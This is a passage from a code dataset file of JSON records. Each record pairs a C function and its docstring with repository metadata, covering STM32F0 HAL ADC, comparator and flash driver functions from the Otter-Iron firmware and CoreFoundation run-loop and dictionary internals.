ADC_STATE_CLR_SET(hadc->State,\n                            HAL_ADC_STATE_REG_BUSY,\n                            HAL_ADC_STATE_READY);\n        }\n        else\n        {\n          /* Change ADC state to error state */\n          SET_BIT(hadc->State, HAL_ADC_STATE_ERROR_CONFIG);\n          \n          /* Set ADC error code to ADC IP internal error */\n          SET_BIT(hadc->ErrorCode, HAL_ADC_ERROR_INTERNAL);\n        }\n      }\n    }\n\n    /* Conversion complete callback */\n    HAL_ADC_ConvCpltCallback(hadc); \n  }\n  else\n  {\n    /* Call DMA error callback */\n    hadc->DMA_Handle->XferErrorCallback(hdma);\n  }\n\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_adc.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Disable the interrupt and Stop the comparator \n  * @param  hcomp COMP handle\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_COMP_Stop_IT(COMP_HandleTypeDef *hcomp)", "code": "{ \n  HAL_StatusTypeDef status = HAL_OK;\n  \n  /* Disable the Exti Line interrupt mode */\n  CLEAR_BIT(EXTI->IMR, COMP_GET_EXTI_LINE(hcomp->Instance));\n  \n  status = HAL_COMP_Stop(hcomp);\n  \n  return status;\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_comp.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Stop ADC conversion of regular group, disable ADC DMA transfer, disable \n  *         ADC peripheral.\n  *         Each of these interruptions has its dedicated callback function.\n  * @param  hadc ADC handle\n  * @retval HAL status.\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_ADC_Stop_DMA(ADC_HandleTypeDef* hadc)", "code": "{  \n  HAL_StatusTypeDef tmp_hal_status = HAL_OK;\n  \n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_INSTANCE(hadc->Instance));\n\n  /* Process locked */\n  __HAL_LOCK(hadc);\n  \n  /* 1. Stop potential conversion on going, on regular group */\n  tmp_hal_status = ADC_ConversionStop(hadc);\n  \n  /* Disable ADC peripheral if conversions are effectively stopped */\n  if (tmp_hal_status == HAL_OK)\n  {\n    /* Disable ADC DMA (ADC DMA configuration ADC_CFGR_DMACFG is kept) */\n    hadc->Instance->CFGR1 &= ~ADC_CFGR1_DMAEN;\n    \n    /* Disable the DMA channel (in case of DMA in circular mode or stop while */\n    /* while DMA transfer is on going)                                        */\n    tmp_hal_status = HAL_DMA_Abort(hadc->DMA_Handle);   \n    \n    /* Check if DMA channel effectively disabled */\n    if (tmp_hal_status != HAL_OK)\n    {\n      /* Update ADC state machine to error */\n      SET_BIT(hadc->State, HAL_ADC_STATE_ERROR_DMA);\n    }\n    \n    /* Disable ADC overrun interrupt */\n    __HAL_ADC_DISABLE_IT(hadc, ADC_IT_OVR);\n    \n    /* 2. Disable the ADC peripheral */\n    /* Update \"tmp_hal_status\" only if DMA channel disabling passed, to keep  */\n    /* in memory a potential failing status.                                  */\n    if (tmp_hal_status == HAL_OK)\n    {\n      tmp_hal_status = ADC_Disable(hadc);\n    }\n    else\n    {\n      ADC_Disable(hadc);\n    }\n\n    /* Check if ADC is effectively disabled */\n    if (tmp_hal_status == HAL_OK)\n    {\n      /* Set ADC state */\n      ADC_STATE_CLR_SET(hadc->State,\n                        HAL_ADC_STATE_REG_BUSY,\n                        HAL_ADC_STATE_READY);\n    }\n    \n  }\n\n  /* Process unlocked */\n  __HAL_UNLOCK(hadc);\n  \n  /* Return function status */\n  return tmp_hal_status;\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_adc.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Poll for conversion event.\n  * @param  hadc ADC handle\n  * @param  EventType the ADC event type.\n  *          This parameter can be one of the following values:\n  *            @arg ADC_AWD_EVENT: ADC Analog watchdog event\n  *            @arg ADC_OVR_EVENT: ADC Overrun event\n  * @param  Timeout Timeout value in millisecond.\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_ADC_PollForEvent(ADC_HandleTypeDef* hadc, uint32_t EventType, uint32_t Timeout)", "code": "{\n  uint32_t tickstart=0; \n  \n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_INSTANCE(hadc->Instance));\n  assert_param(IS_ADC_EVENT_TYPE(EventType));\n  \n  /* Get tick count */\n  tickstart = HAL_GetTick();   \n      \n  /* Check selected event flag */\n  while(__HAL_ADC_GET_FLAG(hadc, EventType) == RESET)\n  {\n    /* Check if timeout is disabled (set to infinite wait) */\n    if(Timeout != HAL_MAX_DELAY)\n    {\n      if((Timeout == 0U) || ((HAL_GetTick()-tickstart) > Timeout))\n      {\n        /* Update ADC state machine to timeout */\n        SET_BIT(hadc->State, HAL_ADC_STATE_TIMEOUT);\n        \n        /* Process unlocked */\n        __HAL_UNLOCK(hadc);\n        \n        return HAL_TIMEOUT;\n      }\n    }\n  }\n\n  switch(EventType)\n  {\n  /* Analog watchdog (level out of window) event */\n  case ADC_AWD_EVENT:\n    /* Set ADC state */\n    SET_BIT(hadc->State, HAL_ADC_STATE_AWD1);\n      \n    /* Clear ADC analog watchdog flag */\n    __HAL_ADC_CLEAR_FLAG(hadc, ADC_FLAG_AWD);\n    break;\n  \n  /* Overrun event */\n  default: /* Case ADC_OVR_EVENT */\n    /* If overrun is set to overwrite previous data, overrun event is not     */\n    /* considered as an error.                                                */\n    /* (cf ref manual \"Managing conversions without using the DMA and without */\n    /* overrun \")                                                             */\n    if (hadc->Init.Overrun == ADC_OVR_DATA_PRESERVED)\n    {\n      /* Set ADC state */\n      SET_BIT(hadc->State, HAL_ADC_STATE_REG_OVR);\n        \n      /* Set ADC error code to overrun */\n      SET_BIT(hadc->ErrorCode, HAL_ADC_ERROR_OVR);\n    }\n    \n    /* Clear ADC Overrun flag */\n    __HAL_ADC_CLEAR_FLAG(hadc, ADC_FLAG_OVR);\n    break;\n  }\n  \n  /* Return ADC state */\n  return HAL_OK;\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_adc.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Enables ADC, starts conversion of regular group with interruption.\n  *         Interruptions enabled in this function:\n  *          - EOC (end of conversion of regular group) or EOS (end of \n  *            sequence of regular group) depending on ADC initialization \n  *            parameter \"EOCSelection\"\n  *          - overrun (if available)\n  *         Each of these interruptions has its dedicated callback function.\n  * @param  hadc ADC handle\n  * @retval HAL status\n  */\n", "func_signal": "HAL_StatusTypeDef HAL_ADC_Start_IT(ADC_HandleTypeDef* hadc)", "code": "{\n  HAL_StatusTypeDef tmp_hal_status = HAL_OK;\n  \n  /* Check the parameters */\n  assert_param(IS_ADC_ALL_INSTANCE(hadc->Instance));\n    \n  /* Perform ADC enable and conversion start if no conversion is on going */\n  if (ADC_IS_CONVERSION_ONGOING_REGULAR(hadc) == RESET)\n  {\n    /* Process locked */\n    __HAL_LOCK(hadc);\n     \n    /* Enable the ADC peripheral */\n    /* If low power mode AutoPowerOff is enabled, power-on/off phases are     */\n    /* performed automatically by hardware.                                   */\n    if (hadc->Init.LowPowerAutoPowerOff != ENABLE)\n    {\n      tmp_hal_status = ADC_Enable(hadc);\n    }\n    \n    /* Start conversion if ADC is effectively enabled */\n    if (tmp_hal_status == HAL_OK)\n    {\n      /* Set ADC state                                                        */\n      /* - Clear state bitfield related to regular group conversion results   */\n      /* - Set state bitfield related to regular operation                    */\n      ADC_STATE_CLR_SET(hadc->State,\n                        HAL_ADC_STATE_READY | HAL_ADC_STATE_REG_EOC | HAL_ADC_STATE_REG_OVR | HAL_ADC_STATE_REG_EOSMP,\n                        HAL_ADC_STATE_REG_BUSY);\n      \n      /* Reset ADC all error code fields */\n      ADC_CLEAR_ERRORCODE(hadc);\n      \n      /* Process unlocked */\n      /* Unlock before starting ADC conversions: in case of potential         */\n      /* interruption, to let the process to ADC IRQ Handler.                 */\n      __HAL_UNLOCK(hadc);\n      \n      /* Clear regular group conversion flag and overrun flag */\n      /* (To ensure of no unknown state from potential previous ADC           */\n      /* operations)                                                          */\n      __HAL_ADC_CLEAR_FLAG(hadc, (ADC_FLAG_EOC | ADC_FLAG_EOS | ADC_FLAG_OVR));\n      \n      /* Enable ADC end of conversion interrupt */\n      /* Enable ADC overrun interrupt */  \n      switch(hadc->Init.EOCSelection)\n      {\n        case ADC_EOC_SEQ_CONV: \n          __HAL_ADC_DISABLE_IT(hadc, ADC_IT_EOC);\n          __HAL_ADC_ENABLE_IT(hadc, (ADC_IT_EOS | ADC_IT_OVR));\n          break;\n        /* case ADC_EOC_SINGLE_CONV */\n        default:\n          __HAL_ADC_ENABLE_IT(hadc, (ADC_IT_EOC | ADC_IT_EOS | ADC_IT_OVR));\n          break;\n      }\n      \n      /* Enable conversion of regular group.                                  */\n      /* If software start has been selected, conversion starts immediately.  */\n      /* If external trigger has been selected, conversion will start at next */\n      /* trigger event.                                                       */\n      hadc->Instance->CR |= ADC_CR_ADSTART;\n    }\n  }\n  else\n  {\n    tmp_hal_status = HAL_BUSY;\n  }    \n    \n  /* Return function status */\n  return tmp_hal_status;\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_adc.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "/**\n  * @brief  Wait for a FLASH operation to complete.\n  * @param  Timeout  maximum flash operation timeout\n  * @retval HAL Status\n  */\n", "func_signal": "HAL_StatusTypeDef FLASH_WaitForLastOperation(uint32_t Timeout)", "code": "{\n  /* Wait for the FLASH operation to complete by polling on BUSY flag to be reset.\n     Even if the FLASH operation fails, the BUSY flag will be reset and an error\n     flag will be set */\n     \n  uint32_t tickstart = HAL_GetTick();\n     \n  while(__HAL_FLASH_GET_FLAG(FLASH_FLAG_BSY)) \n  { \n    if (Timeout != HAL_MAX_DELAY)\n    {\n      if((Timeout == 0U) || ((HAL_GetTick()-tickstart) > Timeout))\n      {\n        return HAL_TIMEOUT;\n      }\n    }\n  }\n  \n  /* Check FLASH End of Operation flag  */\n  if (__HAL_FLASH_GET_FLAG(FLASH_FLAG_EOP))\n  {\n    /* Clear FLASH End of Operation pending bit */\n    __HAL_FLASH_CLEAR_FLAG(FLASH_FLAG_EOP);\n  }\n  \n  if(__HAL_FLASH_GET_FLAG(FLASH_FLAG_WRPERR)  || \n     __HAL_FLASH_GET_FLAG(FLASH_FLAG_PGERR))\n  {\n    /*Save the error code*/\n    FLASH_SetErrorCode();\n    return HAL_ERROR;\n  }\n\n  /* There is no error flag set */\n  return HAL_OK;\n}", "path": "firmware\\Drivers\\STM32F0xx_HAL_Driver\\Src\\stm32f0xx_hal_flash.c", "repo_name": "Jana-Marie/Otter-Iron", "stars": 475, "license": "gpl-3.0", "language": "c", "size": 30665}
{"docstring": "// Called for each thread as it exits\n", "func_signal": "CF_PRIVATE void __CFFinalizeRunLoop(uintptr_t data)", "code": "{\n    CFRunLoopRef rl = NULL;\n    if (data <= 1) {\n\t__CFLock(&loopsLock);\n\tif (__CFRunLoops) {\n\t    rl = (CFRunLoopRef)CFDictionaryGetValue(__CFRunLoops, pthreadPointer(pthread_self()));\n\t    if (rl) CFRetain(rl);\n\t    CFDictionaryRemoveValue(__CFRunLoops, pthreadPointer(pthread_self()));\n\t}\n\t__CFUnlock(&loopsLock);\n    } else {\n        _CFSetTSD(__CFTSDKeyRunLoopCntr, (void *)(data - 1), (void (*)(void *))__CFFinalizeRunLoop);\n    }\n    if (rl && CFRunLoopGetMain() != rl) { // protect against cooperative threads\n        if (NULL != rl->_counterpart) {\n            CFRelease(rl->_counterpart);\n\t    rl->_counterpart = NULL;\n        }\n\t// purge all sources before deallocation\n        CFArrayRef array = CFRunLoopCopyAllModes(rl);\n        for (CFIndex idx = CFArrayGetCount(array); idx--;) {\n            CFStringRef modeName = (CFStringRef)CFArrayGetValueAtIndex(array, idx);\n            __CFRunLoopRemoveAllSources(rl, modeName);\n        }\n        __CFRunLoopRemoveAllSources(rl, kCFRunLoopCommonModes);\n        CFRelease(array);\n    }\n    if (rl) CFRelease(rl);\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// This function is for Foundation's benefit; no one else should use it.\n", "func_signal": "CF_EXPORT Boolean _CFDictionaryIsMutable(CFHashRef hc)", "code": "{\n    if (CF_IS_OBJC(CFDictionaryGetTypeID(), hc)) return false;\n    __CFGenericValidateType(hc, CFDictionaryGetTypeID());\n    return CFBasicHashIsMutable((CFBasicHashRef)hc);\n}", "path": "CFDictionary.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// pass in either a portSet or onePort\n", "func_signal": "static Boolean __CFRunLoopWaitForMultipleObjects(__CFPortSet portSet, HANDLE *onePort, DWORD timeout, DWORD mask, HANDLE *livePort, Boolean *msgReceived)", "code": "{\n    DWORD waitResult = WAIT_TIMEOUT;\n    HANDLE handleBuf[MAXIMUM_WAIT_OBJECTS];\n    HANDLE *handles = NULL;\n    uint32_t handleCount = 0;\n    Boolean freeHandles = false;\n    Boolean result = false;\n    \n    if (portSet) {\n\t// copy out the handles to be safe from other threads at work\n\thandles = __CFPortSetGetPorts(portSet, handleBuf, MAXIMUM_WAIT_OBJECTS, &handleCount);\n\tfreeHandles = (handles != handleBuf);\n    } else {\n\thandles = onePort;\n\thandleCount = 1;\n\tfreeHandles = FALSE;\n    }\n    \n    // The run loop mode and loop are already in proper unlocked state from caller\n    waitResult = MsgWaitForMultipleObjectsEx(__CFMin(handleCount, MAXIMUM_WAIT_OBJECTS), handles, timeout, mask, MWMO_INPUTAVAILABLE);\n    \n    CFAssert2(waitResult != WAIT_FAILED, __kCFLogAssertion, \"%s(): error %d from MsgWaitForMultipleObjects\", __PRETTY_FUNCTION__, GetLastError());\n    \n    if (waitResult == WAIT_TIMEOUT) {\n\t// do nothing, just return to caller\n\tresult = false;\n    } else if (waitResult >= WAIT_OBJECT_0 && waitResult < WAIT_OBJECT_0+handleCount) {\n\t// a handle was signaled\n\tif (livePort) *livePort = handles[waitResult-WAIT_OBJECT_0];\n\tresult = true;\n    } else if (waitResult == WAIT_OBJECT_0+handleCount) {\n\t// windows message received\n        if (msgReceived) *msgReceived = true;\n\tresult = true;\n    } else if (waitResult >= WAIT_ABANDONED_0 && waitResult < WAIT_ABANDONED_0+handleCount) {\n\t// an \"abandoned mutex object\"\n\tif (livePort) *livePort = handles[waitResult-WAIT_ABANDONED_0];\n\tresult = true;\n    } else {\n\tCFAssert2(waitResult == WAIT_FAILED, __kCFLogAssertion, \"%s(): unexpected result from MsgWaitForMultipleObjects: %d\", __PRETTY_FUNCTION__, waitResult);\n\tresult = false;\n    }\n    \n    if (freeHandles) {\n\tCFAllocatorDeallocate(kCFAllocatorSystemDefault, handles);\n    }\n    \n    return result;\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// should only be called by Foundation\n", "func_signal": "CFRunLoopRef _CFRunLoopGet0b(pthread_t t)", "code": "{\n    if (pthread_equal(t, kNilPthreadT)) {\n\tt = pthread_main_thread_np();\n    }\n    __CFLock(&loopsLock);\n    CFRunLoopRef loop = NULL;\n    if (__CFRunLoops) {\n        loop = (CFRunLoopRef)CFDictionaryGetValue(__CFRunLoops, pthreadPointer(t));\n    }\n    __CFUnlock(&loopsLock);\n    return loop;\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// should only be called by Foundation\n// t==0 is a synonym for \"main thread\" that always works\n", "func_signal": "CF_EXPORT CFRunLoopRef _CFRunLoopGet0(pthread_t t)", "code": "{\n    if (pthread_equal(t, kNilPthreadT)) {\n\tt = pthread_main_thread_np();\n    }\n    __CFLock(&loopsLock);\n    if (!__CFRunLoops) {\n        __CFUnlock(&loopsLock);\n\tCFMutableDictionaryRef dict = CFDictionaryCreateMutable(kCFAllocatorSystemDefault, 0, NULL, &kCFTypeDictionaryValueCallBacks);\n\tCFRunLoopRef mainLoop = __CFRunLoopCreate(pthread_main_thread_np());\n\tCFDictionarySetValue(dict, pthreadPointer(pthread_main_thread_np()), mainLoop);\n\tif (!OSAtomicCompareAndSwapPtrBarrier(NULL, dict, (void * volatile *)&__CFRunLoops)) {\n\t    CFRelease(dict);\n\t}\n\tCFRelease(mainLoop);\n        __CFLock(&loopsLock);\n    }\n    CFRunLoopRef loop = (CFRunLoopRef)CFDictionaryGetValue(__CFRunLoops, pthreadPointer(t));\n    __CFUnlock(&loopsLock);\n    if (!loop) {\n\tCFRunLoopRef newLoop = __CFRunLoopCreate(t);\n        __CFLock(&loopsLock);\n\tloop = (CFRunLoopRef)CFDictionaryGetValue(__CFRunLoops, pthreadPointer(t));\n\tif (!loop) {\n\t    CFDictionarySetValue(__CFRunLoops, pthreadPointer(t), newLoop);\n\t    loop = newLoop;\n\t}\n        // don't release run loops inside the loopsLock, because CFRunLoopDeallocate may end up taking it\n        __CFUnlock(&loopsLock);\n\tCFRelease(newLoop);\n    }\n    if (pthread_equal(t, pthread_self())) {\n        _CFSetTSD(__CFTSDKeyRunLoop, (void *)loop, NULL);\n        if (0 == _CFGetTSD(__CFTSDKeyRunLoopCntr)) {\n            _CFSetTSD(__CFTSDKeyRunLoopCntr, (void *)(PTHREAD_DESTRUCTOR_ITERATIONS-1), (void (*)(void *))__CFFinalizeRunLoop);\n        }\n    }\n    return loop;\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// mode and rl are locked on entry and exit\n", "func_signal": "static Boolean __CFRunLoopDoTimer(CFRunLoopRef rl, CFRunLoopModeRef rlm, CFRunLoopTimerRef rlt)", "code": "{\t/* DOES CALLOUT */\n    Boolean timerHandled = false;\n    uint64_t oldFireTSR = 0;\n\n    /* Fire a timer */\n    CFRetain(rlt);\n    __CFRunLoopTimerLock(rlt);\n\n    if (__CFIsValid(rlt) && rlt->_fireTSR <= mach_absolute_time() && !__CFRunLoopTimerIsFiring(rlt) && rlt->_runLoop == rl) {\n        void *context_info = NULL;\n        void (*context_release)(const void *) = NULL;\n        if (rlt->_context.retain) {\n            context_info = (void *)rlt->_context.retain(rlt->_context.info);\n            context_release = rlt->_context.release;\n        } else {\n            context_info = rlt->_context.info;\n        }\n        Boolean doInvalidate = (0.0 == rlt->_interval);\n\t__CFRunLoopTimerSetFiring(rlt);\n        // Just in case the next timer has exactly the same deadlines as this one, we reset these values so that the arm next timer code can correctly find the next timer in the list and arm the underlying timer.\n        rlm->_timerSoftDeadline = UINT64_MAX;\n        rlm->_timerHardDeadline = UINT64_MAX;\n        __CFRunLoopTimerUnlock(rlt);\n\t__CFRunLoopTimerFireTSRLock();\n\toldFireTSR = rlt->_fireTSR;\n\t__CFRunLoopTimerFireTSRUnlock();\n\n        __CFArmNextTimerInMode(rlm, rl);\n\n\t__CFRunLoopModeUnlock(rlm);\n\t__CFRunLoopUnlock(rl);\n\t__CFRUNLOOP_IS_CALLING_OUT_TO_A_TIMER_CALLBACK_FUNCTION__(rlt->_callout, rlt, context_info);\n\tCHECK_FOR_FORK();\n        if (doInvalidate) {\n            CFRunLoopTimerInvalidate(rlt);      /* DOES CALLOUT */\n        }\n        if (context_release) {\n            context_release(context_info);\n        }\n\t__CFRunLoopLock(rl);\n\t__CFRunLoopModeLock(rlm);\n        __CFRunLoopTimerLock(rlt);\n\ttimerHandled = true;\n\t__CFRunLoopTimerUnsetFiring(rlt);\n    }\n    if (__CFIsValid(rlt) && timerHandled) {\n        /* This is just a little bit tricky: we want to support calling\n         * CFRunLoopTimerSetNextFireDate() from within the callout and\n         * honor that new time here if it is a later date, otherwise\n         * it is completely ignored. */\n        if (oldFireTSR < rlt->_fireTSR) {\n            /* Next fire TSR was set, and set to a date after the previous\n            * fire date, so we honor it. */\n            __CFRunLoopTimerUnlock(rlt);\n            // The timer was adjusted and repositioned, during the\n            // callout, but if it was still the min timer, it was\n            // skipped because it was firing.  Need to redo the\n            // min timer calculation in case rlt should now be that\n            // timer instead of whatever was chosen.\n            __CFArmNextTimerInMode(rlm, rl);\n        } else {\n\t    uint64_t nextFireTSR = 0LL;\n            uint64_t intervalTSR = 0LL;\n            if (rlt->_interval <= 0.0) {\n            } else if (TIMER_INTERVAL_LIMIT < rlt->_interval) {\n        \tintervalTSR = __CFTimeIntervalToTSR(TIMER_INTERVAL_LIMIT);\n            } else {\n        \tintervalTSR = __CFTimeIntervalToTSR(rlt->_interval);\n            }\n            if (LLONG_MAX - intervalTSR <= oldFireTSR) {\n                nextFireTSR = LLONG_MAX;\n            } else {\n                if (intervalTSR == 0) {\n                    // 15304159: Make sure we don't accidentally loop forever here\n                    CRSetCrashLogMessage(\"A CFRunLoopTimer with an interval of 0 is set to repeat\");\n                    HALT;\n                }\n                uint64_t currentTSR = mach_absolute_time();\n                nextFireTSR = oldFireTSR;\n                while (nextFireTSR <= currentTSR) {\n                    nextFireTSR += intervalTSR;\n                }\n            }\n            CFRunLoopRef rlt_rl = rlt->_runLoop;\n            if (rlt_rl) {\n                CFRetain(rlt_rl);\n\t\tCFIndex cnt = CFSetGetCount(rlt->_rlModes);\n\t\tSTACK_BUFFER_DECL(CFTypeRef, modes, cnt);\n\t\tCFSetGetValues(rlt->_rlModes, (const void **)modes);\n\t\t// To avoid A->B, B->A lock ordering issues when coming up\n\t\t// towards the run loop from a source, the timer has to be\n\t\t// unlocked, which means we have to protect from object\n\t\t// invalidation, although that's somewhat expensive.\n\t\tfor (CFIndex idx = 0; idx < cnt; idx++) {\n\t\t    CFRetain(modes[idx]);\n\t\t}\n\t\t__CFRunLoopTimerUnlock(rlt);\n\t\tfor (CFIndex idx = 0; idx < cnt; idx++) {\n\t\t    CFStringRef name = (CFStringRef)modes[idx];\n\t\t    modes[idx] = (CFTypeRef)__CFRunLoopFindMode(rlt_rl, name, false);\n\t\t    CFRelease(name);\n\t\t}\n\t\t__CFRunLoopTimerFireTSRLock();\n\t\trlt->_fireTSR = nextFireTSR;\n                rlt->_nextFireDate = CFAbsoluteTimeGetCurrent() + __CFTimeIntervalUntilTSR(nextFireTSR);\n\t\tfor (CFIndex idx = 0; idx < cnt; idx++) {\n\t\t    CFRunLoopModeRef rlm = (CFRunLoopModeRef)modes[idx];\n\t\t    if (rlm) {\n                        __CFRepositionTimerInMode(rlm, rlt, true);\n\t\t    }\n\t\t}\n\t\t__CFRunLoopTimerFireTSRUnlock();\n\t\tfor (CFIndex idx = 0; idx < cnt; idx++) {\n\t\t    __CFRunLoopModeUnlock((CFRunLoopModeRef)modes[idx]);\n\t\t}\n\t\tCFRelease(rlt_rl);\n\t    } else {\n\t\t__CFRunLoopTimerUnlock(rlt);\n\t\t__CFRunLoopTimerFireTSRLock();\n\t\trlt->_fireTSR = nextFireTSR;\n                rlt->_nextFireDate = CFAbsoluteTimeGetCurrent() + __CFTimeIntervalUntilTSR(nextFireTSR);\n\t\t__CFRunLoopTimerFireTSRUnlock();\n            }\n        }\n    } else {\n        __CFRunLoopTimerUnlock(rlt);\n    }\n    CFRelease(rlt);\n    return timerHandled;\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// Remove backreferences the mode's sources have to the rl (context);\n// the primary purpose of rls->_runLoops is so that Invalidation can remove\n// the source from the run loops it is in, but during deallocation of a\n// run loop, we already know that the sources are going to be punted\n// from it, so invalidation of sources does not need to remove from a\n// deallocating run loop.\n", "func_signal": "static void __CFRunLoopCleanseSources(const void *value, void *context)", "code": "{\n    CFRunLoopModeRef rlm = (CFRunLoopModeRef)value;\n    CFRunLoopRef rl = (CFRunLoopRef)context;\n    CFIndex idx, cnt;\n    const void **list, *buffer[256];\n    if (NULL == rlm->_sources0 && NULL == rlm->_sources1) return;\n\n    cnt = (rlm->_sources0 ? CFSetGetCount(rlm->_sources0) : 0) + (rlm->_sources1 ? CFSetGetCount(rlm->_sources1) : 0);\n    list = (const void **)((cnt <= 256) ? buffer : CFAllocatorAllocate(kCFAllocatorSystemDefault, cnt * sizeof(void *), 0));\n    if (rlm->_sources0) CFSetGetValues(rlm->_sources0, list);\n    if (rlm->_sources1) CFSetGetValues(rlm->_sources1, list + (rlm->_sources0 ? CFSetGetCount(rlm->_sources0) : 0));\n    for (idx = 0; idx < cnt; idx++) {\n\tCFRunLoopSourceRef rls = (CFRunLoopSourceRef)list[idx];\n\t__CFRunLoopSourceLock(rls);\n\tif (NULL != rls->_runLoops) {\n\t    CFBagRemoveValue(rls->_runLoops, rl);\n\t}\n\t__CFRunLoopSourceUnlock(rls);\n    }\n    if (list != buffer) CFAllocatorDeallocate(kCFAllocatorSystemDefault, list);\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// The name of this function is a lie on Windows. The return value matches the argument of the fake mk_timer functions above. Note that the Windows timers expect to be given \"system time\". We have to do some calculations to get the right value, which is a FILETIME-like value.\n", "func_signal": "CF_INLINE LARGE_INTEGER __CFUInt64ToAbsoluteTime(uint64_t desiredFireTime)", "code": "{\n    LARGE_INTEGER result;\n    // There is a race we know about here, (timer fire time calculated -> thread suspended -> timer armed == late timer fire), but we don't have a way to avoid it at this time, since the only way to specify an absolute value to the timer is to calculate the relative time first. Fixing that would probably require not using the TSR for timers on Windows.\n    uint64_t now = mach_absolute_time();\n    if (now > desiredFireTime) {\n        result.QuadPart = 0;\n    } else {\n        uint64_t timeDiff = desiredFireTime - now;\n        CFTimeInterval amountOfTimeToWait = __CFTSRToTimeInterval(timeDiff);\n        // Result is in 100 ns (10**-7 sec) units to be consistent with a FILETIME.\n        // CFTimeInterval is in seconds.\n        result.QuadPart = -(amountOfTimeToWait * 10000000);\n    }\n    return result;\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "// expects rl and rlm locked\n", "func_signal": "static Boolean __CFRunLoopModeIsEmpty(CFRunLoopRef rl, CFRunLoopModeRef rlm, CFRunLoopModeRef previousMode)", "code": "{\n    CHECK_FOR_FORK();\n    if (NULL == rlm) return true;\n#if DEPLOYMENT_TARGET_WINDOWS\n    if (0 != rlm->_msgQMask) return false;\n#endif\n    Boolean libdispatchQSafe = pthread_main_np() && ((HANDLE_DISPATCH_ON_BASE_INVOCATION_ONLY && NULL == previousMode) || (!HANDLE_DISPATCH_ON_BASE_INVOCATION_ONLY && 0 == _CFGetTSD(__CFTSDKeyIsInGCDMainQ)));\n    if (libdispatchQSafe && (CFRunLoopGetMain() == rl) && CFSetContainsValue(rl->_commonModes, rlm->_name)) return false; // represents the libdispatch main queue\n    if (NULL != rlm->_sources0 && 0 < CFSetGetCount(rlm->_sources0)) return false;\n    if (NULL != rlm->_sources1 && 0 < CFSetGetCount(rlm->_sources1)) return false;\n    if (NULL != rlm->_timers && 0 < CFArrayGetCount(rlm->_timers)) return false;\n    struct _block_item *item = rl->_blocks_head;\n    while (item) {\n        struct _block_item *curr = item;\n        item = item->_next;\n        Boolean doit = false;\n        if (CFStringGetTypeID() == CFGetTypeID(curr->_mode)) {\n            doit = CFEqual(curr->_mode, rlm->_name) || (CFEqual(curr->_mode, kCFRunLoopCommonModes) && CFSetContainsValue(rl->_commonModes, rlm->_name));\n        } else {\n            doit = CFSetContainsValue((CFSetRef)curr->_mode, rlm->_name) || (CFSetContainsValue((CFSetRef)curr->_mode, kCFRunLoopCommonModes) && CFSetContainsValue(rl->_commonModes, rlm->_name));\n        }\n        if (doit) return false;\n    }\n    return true;\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
{"docstring": "/* CFRunLoopSource */\n", "func_signal": "static Boolean __CFRunLoopSourceEqual(CFTypeRef cf1, CFTypeRef cf2)", "code": "{\t/* DOES CALLOUT */\n    CFRunLoopSourceRef rls1 = (CFRunLoopSourceRef)cf1;\n    CFRunLoopSourceRef rls2 = (CFRunLoopSourceRef)cf2;\n    if (rls1 == rls2) return true;\n    if (__CFIsValid(rls1) != __CFIsValid(rls2)) return false;\n    if (rls1->_order != rls2->_order) return false;\n    if (rls1->_context.version0.version != rls2->_context.version0.version) return false;\n    if (rls1->_context.version0.hash != rls2->_context.version0.hash) return false;\n    if (rls1->_context.version0.equal != rls2->_context.version0.equal) return false;\n    if (0 == rls1->_context.version0.version && rls1->_context.version0.perform != rls2->_context.version0.perform) return false;\n    if (1 == rls1->_context.version0.version && rls1->_context.version1.perform != rls2->_context.version1.perform) return false;\n    if (rls1->_context.version0.equal)\n\treturn rls1->_context.version0.equal(rls1->_context.version0.info, rls2->_context.version0.info);\n    return (rls1->_context.version0.info == rls2->_context.version0.info);\n}", "path": "CFRunLoop.c", "repo_name": "opensource-apple/CF", "stars": 430, "license": "other", "language": "c", "size": 2087}
